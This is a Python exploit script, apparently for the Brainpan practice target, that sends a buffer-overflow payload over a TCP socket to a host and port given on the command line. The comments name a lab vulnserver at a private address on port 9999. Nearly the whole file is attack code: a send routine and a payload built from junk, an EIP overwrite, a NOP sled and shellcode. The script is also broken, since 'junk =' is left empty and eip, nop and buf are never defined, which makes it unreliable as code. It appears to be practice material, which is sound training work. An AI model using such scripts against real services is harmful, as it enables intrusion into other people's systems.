#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# exp for brainpain

import sys
from time import sleep
import socket

# vulnserver running on 192.168.2.66 windows7 x86_64
# nmap 192.168.2.66 found open 9999 port

def attack(dst, dst_port, data):
    try:
        socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.connect((dst, dst_port))
        conn = socks.recv(1024)
        # print(conn)

        dd = data
        socks.send(dd)
        print("Sending buffer: {}".format(dd))
        # print(conn)
    except socket.error as err:
        print("Socket connect failed! {}".format(err))
    finally:
        sleep(1)
        socks.close()

if __name__ == '__main__':
    junk = 
    buff = junk + eip + nop + buf

    host = str(sys.argv[1])
    port = int(sys.argv[2])

    attack(host, port, buff)
